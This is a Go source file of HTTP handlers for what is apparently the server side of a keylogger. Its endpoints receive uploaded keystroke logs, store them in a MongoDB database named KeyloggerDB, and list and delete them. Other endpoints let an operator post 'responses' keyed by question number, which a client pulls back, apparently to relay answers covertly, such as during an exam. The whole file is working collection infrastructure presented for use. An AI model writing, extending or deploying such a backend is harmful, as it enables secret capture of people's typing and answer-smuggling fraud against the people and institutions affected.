package handlers

import (
	"context"
	"net/http"
	"strconv"
	"time"

	"snap-monolith/backend/internal/db"
	"snap-monolith/backend/internal/models"

	"github.com/gin-gonic/gin"
	"go.mongodb.org/mongo-driver/bson"
	"go.mongodb.org/mongo-driver/bson/primitive"
	"go.mongodb.org/mongo-driver/mongo/options"
)

func SyncKeylog(c *gin.Context) {
	var log models.Keylog
	if err := c.ShouldBindJSON(&log); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	log.ID = primitive.NewObjectID()
	log.LastTimestamp = time.Now()

	_, err := db.KeyloggerDB.Collection("keylogs").InsertOne(context.Background(), log)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	c.JSON(http.StatusOK, gin.H{"message": "Keylog synced", "id": log.ID})
}

func GetKeylogResponse(c *gin.Context) {
	qNum := c.Param("questionNumber")
	
	var resp models.KeylogResponse
	opts := options.FindOne().SetSort(bson.M{"submittedAt": -1})
	err := db.KeyloggerDB.Collection("keylogresponses").FindOne(context.Background(), bson.M{"questionNumber": qNum}, opts).Decode(&resp)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Response not found"})
		return
	}

	// Update pull timestamps
	now := time.Now()
	update := bson.M{"$set": bson.M{"lastPulledAt": now}}
	if resp.FirstPulledAt == nil {
		update["$set"].(bson.M)["firstPulledAt"] = now
		resp.FirstPulledAt = &now
	}
	resp.LastPulledAt = &now
	_, _ = db.KeyloggerDB.Collection("keylogresponses").UpdateOne(context.Background(), bson.M{"_id": resp.ID}, update)

	c.JSON(http.StatusOK, resp)
}

func GetAllKeylogs(c *gin.Context) {
	page, _ := strconv.Atoi(c.DefaultQuery("page", "1"))
    limit, _ := strconv.Atoi(c.DefaultQuery("limit", "6")) // 6 items per page
	skip := (page - 1) * limit

	findOptions := options.Find()
	findOptions.SetLimit(int64(limit))
	findOptions.SetSkip(int64(skip))
	findOptions.SetSort(bson.M{"lastTimestamp": -1})

	cursor, err := db.KeyloggerDB.Collection("keylogs").Find(context.Background(), bson.M{}, findOptions)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	defer cursor.Close(context.Background())

	var logs []models.Keylog
	if err = cursor.All(context.Background(), &logs); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	c.JSON(http.StatusOK, logs)
}

func SubmitKeylogResponse(c *gin.Context) {
	var resp models.KeylogResponse
	if err := c.ShouldBindJSON(&resp); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	resp.ID = primitive.NewObjectID()
	resp.SubmittedAt = time.Now()

	_, err := db.KeyloggerDB.Collection("keylogresponses").InsertOne(context.Background(), resp)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	c.JSON(http.StatusCreated, gin.H{"message": "Response saved"})
}

func DeleteKeylog(c *gin.Context) {
	id, err := primitive.ObjectIDFromHex(c.Param("id"))
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid ID"})
		return
	}

	_, err = db.KeyloggerDB.Collection("keylogs").DeleteOne(context.Background(), bson.M{"_id": id})
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	c.JSON(http.StatusOK, gin.H{"message": "Keylog deleted successfully"})
}

func DeleteKeylogResponses(c *gin.Context) {
	id, err := primitive.ObjectIDFromHex(c.Param("keylogId"))
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid Keylog ID"})
		return
	}

	_, err = db.KeyloggerDB.Collection("keylogresponses").DeleteMany(context.Background(), bson.M{"keylogId": id})
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	c.JSON(http.StatusOK, gin.H{"message": "All responses for this log deleted successfully"})
}

func GetKeylogResponsesByID(c *gin.Context) {
	id, err := primitive.ObjectIDFromHex(c.Param("keylogId"))
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid Keylog ID"})
		return
	}

	cursor, err := db.KeyloggerDB.Collection("keylogresponses").Find(context.Background(), bson.M{"keylogId": id})
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	defer cursor.Close(context.Background())

	var responses []models.KeylogResponse
	if err = cursor.All(context.Background(), &responses); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	c.JSON(http.StatusOK, responses)
}

func DeleteKeylogResponse(c *gin.Context) {
	id, err := primitive.ObjectIDFromHex(c.Param("id"))
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid ID"})
		return
	}

	_, err = db.KeyloggerDB.Collection("keylogresponses").DeleteOne(context.Background(), bson.M{"_id": id})
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	c.JSON(http.StatusOK, gin.H{"message": "Response deleted successfully"})
}
